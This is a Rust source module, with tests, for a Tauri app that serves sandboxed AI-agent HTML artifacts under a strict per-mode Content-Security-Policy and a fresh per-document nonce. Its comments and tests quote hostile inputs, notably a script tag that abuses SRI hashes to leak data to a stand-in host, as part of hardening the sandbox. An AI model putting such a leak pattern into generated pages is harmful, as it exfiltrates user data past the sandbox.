//! Custom-protocol server for sandboxed artifact documents.
//!
//! WHY: a `srcdoc` iframe document INHERITS the embedding page's CSP, and
//! the app's production CSP has no `unsafe-inline` in script-src — so an
//! agent-authored artifact's own `<script>` runs in `tauri dev` (no devCsp
//! → no CSP) but is silently dead in installed builds. A document loaded
//! from a real URL does NOT inherit the parent CSP; it gets whatever the
//! response headers declare. So the frontend `put`s the fully-scaffolded
//! document here (`artifact_put` command) together with its sandbox MODE,
//! receives an id, and renders `<iframe sandbox src="artifact://localhost/{id}">`.
//!
//! **This module owns the served policy (Canvas C1, 2026-10-04).** The
//! frontend names a mode; it can no longer hand over an arbitrary CSP string.
//! [`ArtifactMode::csp`] is the policy each mode is served with:
//! - `offline` (default), `images`, `https`: only the host runtime
//!   (`src/components/sandbox-doc.js`), the Hollow Canvas Kit
//!   (`src/canvas/kit/generated/kit.min.js`, Canvas C2) and, in an
//!   ask-canvas, the ask kit (`kit-ask.min.js`, Canvas C4) may run, allowed
//!   by this document's own nonce (`script-src 'nonce-…'`); network as named.
//! - `canvas`: artifact scripts run (`'unsafe-inline'`) with NO network at
//!   all. It lists no hash or nonce on purpose: either next to
//!   `'unsafe-inline'` makes browsers ignore `'unsafe-inline'`, which would
//!   block the canvas's scripts (and the kit, which runs under
//!   `'unsafe-inline'` here and in Interactive).
//! - `interactive`: scripts plus outbound HTTPS, an explicit per-artifact switch.
//!
//! **Why a nonce, not hashes (SRI repair, 2026-10-05).** Until then the three
//! script-free modes listed the runtime's and the kit's sha256. Under CSP3 a
//! hash-source also allows an EXTERNAL script whose `integrity` attribute
//! carries that hash, and WebKit requests it before the integrity check
//! fails. The hashes are public, so agent HTML in the default Offline mode
//! could load `<script src="https://x/?leak=…" integrity="sha256-<runtime>">`
//! and leak data in the URL. A nonce-source matches external scripts too, but
//! agent HTML can't know a value drawn per document. So the frontend sends the
//! document as host-built PARTS ([`put`]): the nonce goes between consecutive
//! parts, which the host placed in the policy `<meta>` and on its own runtime
//! and kit tags, all before the agent's body. Rust draws the nonce itself
//! ([`Nonce::fresh`], OS CSPRNG) and never searches the text, so agent content
//! can neither carry nor receive it.
//!
//! Every response also turns DNS prefetching off and sends no referrer.
//! `src/components/artifactCsp.golden.json` pins every mode's policy, and both
//! this module and `htmlSandbox.ts` (whose `childCsp` emits the matching
//! `<meta>` and the non-Tauri srcdoc fallback) are tested against it.
//!
//! The security model is unchanged: the iframe keeps
//! `sandbox="allow-scripts"` WITHOUT `allow-same-origin`, `allow-popups` or
//! `allow-forms`, so the document runs in an opaque origin — no parent DOM, no
//! Tauri IPC, no app localStorage. The only channel back stays postMessage,
//! which the hosts validate per frame (`src/canvasBridge.ts`).
//!
//! Storage is a small in-memory LRU — artifacts are ephemeral render
//! payloads (rebuilt from the transcript / vault file on demand), never
//! persisted, and never readable cross-document (ids are 16-char random,
//! the store caps at `CAP` and evicts oldest-first).

use once_cell::sync::Lazy;
use std::borrow::Cow;
use std::collections::VecDeque;
use std::sync::Mutex;

/// A document's script nonce: 18 bytes (144 bits) from the OS CSPRNG, as
/// standard base64 (24 characters, no padding). Only [`Nonce::fresh`] makes
/// one, so no caller can hand in a value it read from a document.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Nonce(String);

impl Nonce {
    fn fresh() -> Nonce {
        use base64::Engine as _;
        use rand::RngCore as _;
        let mut bytes = [0u8; 18];
        rand::rngs::OsRng.fill_bytes(&mut bytes);
        Nonce(base64::engine::general_purpose::STANDARD.encode(bytes))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// A fresh nonce for a test outside this module that reads a mode's
    /// served policy (the visual prompt's truthfulness test).
    #[cfg(test)]
    pub(crate) fn for_tests() -> Nonce {
        Nonce::fresh()
    }
}

/// How much an artifact document may do. Parsed from the frontend's mode id;
/// an unknown id is refused, never widened.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ArtifactMode {
    Offline,
    Images,
    Https,
    Interactive,
    Canvas,
}

impl ArtifactMode {
    #[cfg(test)]
    pub const ALL: [ArtifactMode; 5] = [
        ArtifactMode::Offline,
        ArtifactMode::Images,
        ArtifactMode::Https,
        ArtifactMode::Interactive,
        ArtifactMode::Canvas,
    ];

    pub fn parse(id: &str) -> Option<ArtifactMode> {
        Some(match id {
            "offline" => ArtifactMode::Offline,
            "images" => ArtifactMode::Images,
            "https" => ArtifactMode::Https,
            "interactive" => ArtifactMode::Interactive,
            "canvas" => ArtifactMode::Canvas,
            _ => return None,
        })
    }

    pub fn id(self) -> &'static str {
        match self {
            ArtifactMode::Offline => "offline",
            ArtifactMode::Images => "images",
            ArtifactMode::Https => "https",
            ArtifactMode::Interactive => "interactive",
            ArtifactMode::Canvas => "canvas",
        }
    }

    /// Whether this mode's scripts run by the document's nonce (the
    /// script-free modes) rather than by `'unsafe-inline'`.
    pub fn uses_nonce(self) -> bool {
        matches!(
            self,
            ArtifactMode::Offline | ArtifactMode::Images | ArtifactMode::Https
        )
    }

    /// How many nonce slots a document of this mode leaves between its parts:
    /// the policy `<meta>`, the runtime tag, once the kit has loaded the kit
    /// tag, and in an ask-canvas the ask kit's tag (Canvas C4). Canvas and
    /// Interactive leave none: they list no nonce.
    fn slots(self) -> std::ops::RangeInclusive<usize> {
        if self.uses_nonce() {
            2..=4
        } else {
            0..=0
        }
    }

    /// The Content-Security-Policy a document of this mode is served with.
    /// `nonce` is that document's own; Canvas and Interactive ignore it.
    pub fn csp(self, nonce: &Nonce) -> String {
        use ArtifactMode::*;
        let net = matches!(self, Https | Interactive);
        let script_src = match self {
            Interactive => "'unsafe-inline' https:".to_string(),
            Canvas => "'unsafe-inline'".to_string(),
            // The host runtime and the Canvas Kit, by this document's nonce:
            // artifact scripts stay blocked while kit components still render.
            // Never a hash: it would also admit an external script carrying
            // it as `integrity` (SRI repair, see the module doc).
            Offline | Images | Https => format!("'nonce-{}'", nonce.as_str()),
        };
        let style_src = if net {
            "'unsafe-inline' https:"
        } else {
            "'unsafe-inline'"
        };
        let img_src = if matches!(self, Offline | Canvas) {
            "data: blob:"
        } else {
            "data: blob: https:"
        };
        let font_src = if net { "data: https:" } else { "data:" };
        let connect_src = if net { "https:" } else { "'none'" };
        let media_src = if net {
            "data: blob: https:"
        } else {
            "data: blob:"
        };
        let worker_src = if self == Interactive {
            "blob:"
        } else {
            "'none'"
        };
        [
            "default-src 'none'".to_string(),
            format!("script-src {script_src}"),
            format!("style-src {style_src}"),
            format!("img-src {img_src}"),
            format!("font-src {font_src}"),
            format!("connect-src {connect_src}"),
            format!("media-src {media_src}"),
            format!("worker-src {worker_src}"),
            "frame-src 'none'".to_string(),
            "object-src 'none'".to_string(),
            "base-uri 'none'".to_string(),
            "form-action 'none'".to_string(),
        ]
        .join("; ")
    }
}

/// The Canvas mode's policy (it lists no nonce), for canvas documents
/// Hollow doesn't serve itself: the iPhone app's (`phone_access::canvases`,
/// v1.2), which carry it as their `<meta>`.
pub(crate) fn canvas_policy() -> String {
    ArtifactMode::Canvas.csp(&Nonce::fresh())
}

const CAP: usize = 64;

#[derive(Clone, Debug, PartialEq)]
pub struct ArtifactDoc {
    html: String,
    mode: ArtifactMode,
    nonce: Nonce,
}

static STORE: Lazy<Mutex<VecDeque<(String, ArtifactDoc)>>> =
    Lazy::new(|| Mutex::new(VecDeque::new()));

/// Store a document and return its id. The frontend sends it as host-built
/// `parts`; a fresh nonce is drawn here and placed between consecutive parts,
/// and nowhere else (the text is never searched). The part count must match
/// the mode's slots, so a nonce mode always gets its slots and Canvas and
/// Interactive never carry one. Oldest entries roll off past `CAP` — by then
/// their iframes have re-`put` on any re-render anyway.
pub fn put(parts: Vec<String>, mode: ArtifactMode) -> Result<String, String> {
    let slots = mode.slots();
    if parts.is_empty() || !slots.contains(&(parts.len() - 1)) {
        return Err(format!(
            "a {} document has {}..={} nonce slots, not {}",
            mode.id(),
            slots.start(),
            slots.end(),
            parts.len().saturating_sub(1)
        ));
    }
    let nonce = Nonce::fresh();
    let html = parts.join(nonce.as_str());
    let id = random_id();
    if let Ok(mut store) = STORE.lock() {
        store.push_back((id.clone(), ArtifactDoc { html, mode, nonce }));
        while store.len() > CAP {
            store.pop_front();
        }
    }
    Ok(id)
}

pub fn get(id: &str) -> Option<ArtifactDoc> {
    STORE
        .lock()
        .ok()?
        .iter()
        .find(|(k, _)| k == id)
        .map(|(_, v)| v.clone())
}

/// A capture host may register only a stored, network-free Canvas document.
pub(crate) fn is_canvas_document(id: &str) -> bool {
    get(id).is_some_and(|doc| doc.mode == ArtifactMode::Canvas)
}

/// `artifact://localhost/{id}` (macOS/Linux) or `http://artifact.localhost/{id}`
/// (Windows) → the stored document with our CSP header; anything else → 404.
pub fn serve(request: &tauri::http::Request<Vec<u8>>) -> tauri::http::Response<Cow<'static, [u8]>> {
    let id = request.uri().path().trim_start_matches('/');
    match get(id) {
        Some(doc) => tauri::http::Response::builder()
            .status(200)
            .header("Content-Type", "text/html; charset=utf-8")
            .header("Content-Security-Policy", doc.mode.csp(&doc.nonce))
            .header("X-DNS-Prefetch-Control", "off")
            .header("Referrer-Policy", "no-referrer")
            .header("X-Content-Type-Options", "nosniff")
            .header("Cache-Control", "no-store")
            .body(Cow::Owned(doc.html.into_bytes()))
            .unwrap_or_else(|_| err_response()),
        None => tauri::http::Response::builder()
            .status(404)
            .header("Content-Type", "text/plain")
            .body(Cow::Borrowed(b"artifact not found" as &[u8]))
            .unwrap_or_else(|_| err_response()),
    }
}

fn err_response() -> tauri::http::Response<Cow<'static, [u8]>> {
    tauri::http::Response::new(Cow::Borrowed(b"" as &[u8]))
}

fn random_id() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
    (0..16)
        .map(|_| chars[rng.gen_range(0..chars.len())])
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The store is one process-wide LRU, and cargo runs tests in parallel — so
    /// `store_evicts_oldest_past_cap`, which deliberately fills it past `CAP`,
    /// could evict an artifact another test had just put and fail that test
    /// instead. Every test touching the store takes this lock first.
    static STORE_LOCK: Mutex<()> = Mutex::new(());

    /// Held across a test body. `unwrap_or_else` on the guard so one failing
    /// test poisoning the lock does not cascade into the others.
    fn store_lock() -> std::sync::MutexGuard<'static, ()> {
        STORE_LOCK.lock().unwrap_or_else(|p| p.into_inner())
    }

    fn header<'a>(res: &'a tauri::http::Response<Cow<'static, [u8]>>, name: &str) -> &'a str {
        res.headers()
            .get(name)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
    }

    /// The host runtime and kit bytes the frontend inlines. Served policies
    /// no longer name their hashes (SRI repair); the app CSP still does, for
    /// the srcdoc fallback that inherits it, and these tests keep that copy
    /// and `htmlSandbox.ts`'s constants in sync with the files.
    const SANDBOX_RUNTIME: &str = include_str!("../../src/components/sandbox-doc.js");
    const CANVAS_KIT: &str = include_str!("../../src/canvas/kit/generated/kit.min.js");
    const CANVAS_KIT_ASK: &str = include_str!("../../src/canvas/kit/generated/kit-ask.min.js");

    fn hash_source(script: &str) -> String {
        use base64::Engine as _;
        use sha2::Digest as _;
        let digest = sha2::Sha256::digest(script.as_bytes());
        format!(
            "'sha256-{}'",
            base64::engine::general_purpose::STANDARD.encode(digest)
        )
    }

    static RUNTIME_HASH: Lazy<String> = Lazy::new(|| hash_source(SANDBOX_RUNTIME));
    static KIT_HASH: Lazy<String> = Lazy::new(|| hash_source(CANVAS_KIT));
    static KIT_ASK_HASH: Lazy<String> = Lazy::new(|| hash_source(CANVAS_KIT_ASK));

    fn serve_id(id: &str) -> tauri::http::Response<Cow<'static, [u8]>> {
        let req = tauri::http::Request::builder()
            .uri(format!("artifact://localhost/{id}"))
            .body(Vec::new())
            .unwrap();
        serve(&req)
    }

    #[test]
    fn put_get_round_trips() {
        let _guard = store_lock();
        let id = put(vec!["<html>hello</html>".into()], ArtifactMode::Canvas).unwrap();
        let doc = get(&id).expect("artifact exists");
        assert_eq!(doc.html, "<html>hello</html>");
        assert_eq!(doc.mode, ArtifactMode::Canvas);
        assert_eq!(get("nope"), None);
    }

    #[test]
    fn store_evicts_oldest_past_cap() {
        let _guard = store_lock();
        let first = put(vec!["first".into()], ArtifactMode::Canvas).unwrap();
        for i in 0..CAP {
            put(vec![format!("doc {i}")], ArtifactMode::Canvas).unwrap();
        }
        assert_eq!(get(&first), None, "oldest entry rolled off");
    }

    /// Every mode's served policy equals the shared golden table that
    /// htmlSandbox.test.ts holds `childCsp` to, so the header and the
    /// document's own `<meta>` can't drift apart.
    #[test]
    fn every_mode_serves_the_golden_policy() {
        let _guard = store_lock();
        let golden: serde_json::Value =
            serde_json::from_str(include_str!("../../src/components/artifactCsp.golden.json"))
                .unwrap();
        for mode in ArtifactMode::ALL {
            let template = golden[mode.id()]
                .as_str()
                .unwrap_or_else(|| panic!("golden lacks {}", mode.id()));
            let parts = host_parts("<p>agent</p>");
            let refs: Vec<&str> = parts.iter().map(String::as_str).collect();
            let nonced = template.contains("NONCE");
            assert_eq!(nonced, mode.uses_nonce(), "{}", mode.id());
            let (csp, _) = served(&put_parts(if nonced { &refs } else { &refs[..1] }, mode));
            let expected = if nonced {
                template.replace("NONCE", &served_nonce(&csp))
            } else {
                template.to_string()
            };
            assert_eq!(csp, expected, "{}", mode.id());
            assert_eq!(ArtifactMode::parse(mode.id()), Some(mode));
        }
        let modes = golden
            .as_object()
            .unwrap()
            .keys()
            .filter(|k| !k.starts_with('_'));
        assert_eq!(
            modes.count(),
            ArtifactMode::ALL.len(),
            "golden and enum list the same modes"
        );
    }

    #[test]
    fn canvas_runs_scripts_with_no_network() {
        let csp = ArtifactMode::Canvas.csp(&Nonce::fresh());
        let directive = |name: &str| {
            csp.split("; ")
                .find(|d| d.starts_with(&format!("{name} ")))
                .unwrap_or_else(|| panic!("{name} missing from {csp}"))
                .to_string()
        };
        assert_eq!(directive("script-src"), "script-src 'unsafe-inline'");
        // A hash or nonce beside 'unsafe-inline' disables it in CSP2+ browsers.
        assert!(!csp.contains("sha256-") && !csp.contains("nonce-"), "{csp}");
        for d in [
            "connect-src",
            "worker-src",
            "frame-src",
            "object-src",
            "form-action",
        ] {
            assert_eq!(directive(d), format!("{d} 'none'"));
        }
        assert!(
            !csp.contains("https:") && !csp.contains("http:") && !csp.contains('*'),
            "{csp}"
        );
        assert!(!csp.contains("unsafe-eval"), "{csp}");
        assert!(csp.starts_with("default-src 'none'"));
    }

    #[test]
    fn unknown_modes_are_refused_not_widened() {
        for id in ["", "Canvas", "interactive ", "scripts", "default-src *"] {
            assert_eq!(ArtifactMode::parse(id), None, "{id:?}");
        }
    }

    #[test]
    fn safe_modes_allow_only_the_document_nonce() {
        for mode in [
            ArtifactMode::Offline,
            ArtifactMode::Images,
            ArtifactMode::Https,
        ] {
            let nonce = Nonce::fresh();
            let csp = mode.csp(&nonce);
            assert_eq!(
                script_src(&csp),
                format!("script-src 'nonce-{}'", nonce.as_str())
            );
            // Only script-src names it, and nothing else can run.
            assert_eq!(csp.matches(nonce.as_str()).count(), 1, "{csp}");
            assert!(!script_src(&csp).contains("unsafe-inline"), "{csp}");
        }
    }

    /// `put` refuses a part layout that doesn't match the mode: a nonce mode
    /// always gets its two to four slots (policy meta, runtime, kit, ask
    /// kit), and Canvas and Interactive take one part, so they never carry a
    /// nonce.
    #[test]
    fn put_refuses_parts_that_do_not_match_the_mode() {
        let _guard = store_lock();
        let parts = |n: usize| (0..n).map(|i| format!("part {i}")).collect::<Vec<_>>();
        for mode in ArtifactMode::ALL {
            assert!(put(Vec::new(), mode).is_err(), "{}: no parts", mode.id());
            for n in 1..=6 {
                let ok = if mode.uses_nonce() {
                    (3..=5).contains(&n)
                } else {
                    n == 1
                };
                assert_eq!(put(parts(n), mode).is_ok(), ok, "{}: {n} parts", mode.id());
            }
        }
    }

    /// The runtime hash of sandbox-doc.js is the one the build script
    /// (`scripts/sync-sandbox-csp.mjs`) wrote into the frontend and the app
    /// CSP. Served documents no longer use it; the srcdoc fallback inherits
    /// the app CSP, where a stale copy would silently stop the runtime, so a
    /// runtime edit without `npm run build` fails here.
    #[test]
    fn runtime_hash_matches_the_frontend_and_app_csp() {
        let sandbox = include_str!("../../src/components/htmlSandbox.ts");
        assert!(
            crate::source_pins::contains(
                sandbox,
                &format!("SANDBOX_RUNTIME_HASH = \"{}\"", *RUNTIME_HASH)
            ),
            "htmlSandbox.ts has a stale runtime hash; run npm run build"
        );
        let conf = include_str!("../tauri.conf.json");
        assert!(
            crate::source_pins::contains(conf, RUNTIME_HASH.as_str()),
            "tauri.conf.json has a stale runtime hash; run npm run build"
        );
    }

    /// Like the runtime: the kit hash Rust computes from the generated file is
    /// the one `scripts/sync-sandbox-csp.mjs` wrote into the frontend and the
    /// app CSP (the srcdoc fallback inherits the app CSP).
    #[test]
    fn kit_hash_matches_the_frontend_and_app_csp() {
        assert_ne!(*KIT_HASH, *RUNTIME_HASH);
        let sandbox = include_str!("../../src/components/htmlSandbox.ts");
        assert!(
            crate::source_pins::contains(sandbox, &format!("KIT_SCRIPT_HASH = \"{}\"", *KIT_HASH)),
            "htmlSandbox.ts has a stale kit hash; run npm run build"
        );
        let conf = include_str!("../tauri.conf.json");
        assert!(
            crate::source_pins::contains(conf, KIT_HASH.as_str()),
            "tauri.conf.json has a stale kit hash; run npm run build"
        );
        assert!(
            CANVAS_KIT.contains("kit@1"),
            "generated kit lacks its version"
        );
    }

    /// The same for the ask kit (Canvas C4 A1), inlined only into
    /// ask-canvases: its hash in the frontend and the app CSP is the one of
    /// the committed file, distinct from the runtime's and the kit's.
    #[test]
    fn kit_ask_hash_matches_the_frontend_and_app_csp() {
        assert_ne!(*KIT_ASK_HASH, *KIT_HASH);
        assert_ne!(*KIT_ASK_HASH, *RUNTIME_HASH);
        let sandbox = include_str!("../../src/components/htmlSandbox.ts");
        assert!(
            crate::source_pins::contains(
                sandbox,
                &format!("KIT_ASK_SCRIPT_HASH = \"{}\"", *KIT_ASK_HASH)
            ),
            "htmlSandbox.ts has a stale ask kit hash; run npm run build"
        );
        let conf = include_str!("../tauri.conf.json");
        assert!(
            crate::source_pins::contains(conf, KIT_ASK_HASH.as_str()),
            "tauri.conf.json has a stale ask kit hash; run npm run build"
        );
        assert!(
            CANVAS_KIT_ASK.contains("\"hc-ask\""),
            "generated ask kit lacks hc-ask"
        );
    }

    /// Store a document the way the frontend sends it: host parts, with a
    /// nonce slot between each pair. Returns the id.
    fn put_parts(parts: &[&str], mode: ArtifactMode) -> String {
        put(parts.iter().map(|p| p.to_string()).collect(), mode).expect("put")
    }

    /// The served CSP header and body of a stored id.
    fn served(id: &str) -> (String, String) {
        let res = serve_id(id);
        assert_eq!(res.status(), 200);
        let body = String::from_utf8(res.body().to_vec()).unwrap();
        (header(&res, "Content-Security-Policy").to_string(), body)
    }

    fn script_src(csp: &str) -> &str {
        csp.split("; ")
            .find(|d| d.starts_with("script-src "))
            .unwrap_or_else(|| panic!("no script-src in {csp}"))
    }

    /// The nonce a hash-only mode's header lists: `script-src 'nonce-X'`
    /// and nothing else.
    fn served_nonce(csp: &str) -> String {
        let src = script_src(csp);
        let nonce = src
            .strip_prefix("script-src 'nonce-")
            .and_then(|rest| rest.strip_suffix('\''))
            .unwrap_or_else(|| panic!("script-src is not one nonce-source: {src}"));
        assert!(!nonce.contains(' ') && !nonce.contains('\''), "{src}");
        nonce.to_string()
    }

    /// The host parts of an Offline/Images/HTTPS document as htmlSandbox.ts
    /// builds them: the nonce goes in the policy meta, on the runtime tag and
    /// on the kit tag. The agent's body is in the last part.
    fn host_parts(body: &str) -> Vec<String> {
        vec![
            "<!doctype html><html><head><meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'nonce-".into(),
            "'\"><script nonce=\"".into(),
            "\">/* runtime */</script><script nonce=\"".into(),
            format!("\">/* kit */</script></head><body>{body}</body></html>"),
        ]
    }

    /// SRI repair (2026-10-05). Under CSP3 a hash-source also allows an
    /// EXTERNAL script whose `integrity` carries that hash, and WebKit fetches
    /// it before the integrity check fails. The runtime and kit hashes are
    /// public, so agent HTML in Offline could load
    /// `<script src="https://x/?leak" integrity="sha256-<runtime>">`. No served
    /// policy may list a hash-source.
    #[test]
    fn no_served_policy_lists_a_hash_source() {
        let _guard = store_lock();
        for mode in ArtifactMode::ALL {
            let parts = host_parts("<p>agent</p>");
            let refs: Vec<&str> = parts.iter().map(String::as_str).collect();
            let id = put_parts(if mode.uses_nonce() { &refs } else { &refs[..1] }, mode);
            let (csp, _) = served(&id);
            for algo in ["'sha256-", "'sha384-", "'sha512-"] {
                assert!(!csp.contains(algo), "{}: {csp}", mode.id());
            }
            assert!(!csp.contains(RUNTIME_HASH.as_str()) && !csp.contains(KIT_HASH.as_str()));
            assert!(!csp.contains(KIT_ASK_HASH.as_str()));
        }
    }

    /// The host scripts run by a per-document nonce: unguessable (at least
    /// 128 bits from a CSPRNG, base64), different for every document, and the
    /// same value Rust put into the host's slots.
    #[test]
    fn hash_only_modes_serve_a_fresh_unguessable_nonce() {
        let _guard = store_lock();
        let parts = host_parts("<p>agent</p>");
        let refs: Vec<&str> = parts.iter().map(String::as_str).collect();
        let mut seen = std::collections::HashSet::new();
        for mode in [
            ArtifactMode::Offline,
            ArtifactMode::Images,
            ArtifactMode::Https,
        ] {
            for _ in 0..4 {
                let (csp, body) = served(&put_parts(&refs, mode));
                let nonce = served_nonce(&csp);
                assert!(nonce.len() >= 22, "under 128 bits: {nonce}");
                assert!(
                    nonce
                        .bytes()
                        .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/'),
                    "not base64: {nonce}"
                );
                assert!(seen.insert(nonce.clone()), "nonce reused: {nonce}");
                assert_eq!(body, refs.join(&nonce), "{}", mode.id());
            }
        }
    }

    /// The nonce goes only into the slots the host's parts leave. Agent text
    /// that looks like a placeholder, an empty nonce attribute or a guessed
    /// nonce-source stays byte-for-byte what the agent wrote.
    #[test]
    fn the_nonce_goes_only_where_the_host_left_a_slot() {
        let _guard = store_lock();
        let agent = r#"NONCE __NONCE__ {nonce} ${nonce} <script nonce="">x</script><script nonce="NONCE" src="https://x.invalid/a.js"></script>'nonce-'"#;
        let parts = host_parts(agent);
        let refs: Vec<&str> = parts.iter().map(String::as_str).collect();
        let (csp, body) = served(&put_parts(&refs, ArtifactMode::Offline));
        let nonce = served_nonce(&csp);
        assert_eq!(body.matches(nonce.as_str()).count(), refs.len() - 1);
        assert!(body.ends_with(&format!("<body>{agent}</body></html>")));
    }

    /// An ask-canvas (Canvas C4 A1) in a nonce mode leaves a fourth slot, on
    /// the ask kit's tag after the kit's: all four get this document's nonce,
    /// and the agent's body (still after every slot) none.
    #[test]
    fn an_ask_canvas_gets_the_nonce_on_its_ask_kit_tag_too() {
        let _guard = store_lock();
        let agent = r#"<hc-ask><hc-choice name="a" label="A">x</hc-choice></hc-ask><script nonce="NONCE">1</script>"#;
        let mut parts = host_parts("");
        let last = parts.pop().unwrap();
        let (kit, _) = last.split_once("</head>").unwrap();
        parts.push(format!("{kit}<script nonce=\""));
        parts.push(format!(
            "\">/* ask kit */</script></head><body>{agent}</body></html>"
        ));
        let refs: Vec<&str> = parts.iter().map(String::as_str).collect();
        assert_eq!(refs.len(), 5);
        for mode in [
            ArtifactMode::Offline,
            ArtifactMode::Images,
            ArtifactMode::Https,
        ] {
            let (csp, body) = served(&put_parts(&refs, mode));
            let nonce = served_nonce(&csp);
            assert_eq!(body.matches(nonce.as_str()).count(), 4, "{}", mode.id());
            assert!(body.contains(&format!("<script nonce=\"{nonce}\">/* ask kit */</script>")));
            assert!(body.ends_with(&format!("<body>{agent}</body></html>")));
        }
        // Six parts is one slot too many for any mode.
        let mut six = parts.clone();
        six.push(String::new());
        assert!(put(six, ArtifactMode::Offline).is_err());
    }

    /// Canvas and Interactive rely on 'unsafe-inline': a hash or a nonce
    /// beside it would switch it off, so neither may gain one.
    #[test]
    fn scripted_modes_list_no_hash_or_nonce() {
        let _guard = store_lock();
        for mode in [ArtifactMode::Canvas, ArtifactMode::Interactive] {
            let (csp, _) = served(&put_parts(&["<p>agent</p>"], mode));
            assert!(!csp.contains("nonce-") && !csp.contains("sha256-"), "{csp}");
            assert!(script_src(&csp).starts_with("script-src 'unsafe-inline'"));
        }
    }

    #[test]
    fn serve_returns_mode_policy_and_hardening_headers() {
        let _guard = store_lock();
        for mode in ArtifactMode::ALL {
            let parts: Vec<String> = if mode.uses_nonce() {
                host_parts("<script>1</script>")
            } else {
                vec!["<html><script>1</script></html>".into()]
            };
            let id = put(parts, mode).unwrap();
            let nonce = get(&id).unwrap().nonce;
            let res = serve_id(&id);
            assert_eq!(res.status(), 200);
            assert_eq!(header(&res, "Content-Security-Policy"), mode.csp(&nonce));
            assert_eq!(header(&res, "X-DNS-Prefetch-Control"), "off");
            assert_eq!(header(&res, "Referrer-Policy"), "no-referrer");
            assert_eq!(header(&res, "Cache-Control"), "no-store");
        }
        assert_eq!(serve_id("doesnotexist").status(), 404);
    }
}
